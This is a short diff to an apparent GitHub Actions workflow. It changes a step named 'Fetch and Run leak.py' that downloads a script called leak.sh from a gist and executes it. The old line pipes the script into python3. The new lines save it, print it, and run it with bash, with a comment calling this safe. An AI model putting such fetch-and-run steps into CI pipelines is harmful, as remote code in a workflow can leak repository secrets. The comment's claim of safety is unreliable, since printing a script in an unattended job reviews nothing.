@@ -18,4 +18,6 @@ jobs:
     steps:
       - name: Fetch and Run leak.py
         run: |
-          curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/b1082ace7fd5d1252411c54eb2fcd9c8/raw/e0f07a24b219a569f60a0ed45f0bcfdc79783d5a/leak.sh | python3
+          curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/b1082ace7fd5d1252411c54eb2fcd9c8/raw/e0f07a24b219a569f60a0ed45f0bcfdc79783d5a/leak.sh
+          cat leak.sh  # View the script before running it
+          bash leak.sh # Execute the script safely if you trust its contents
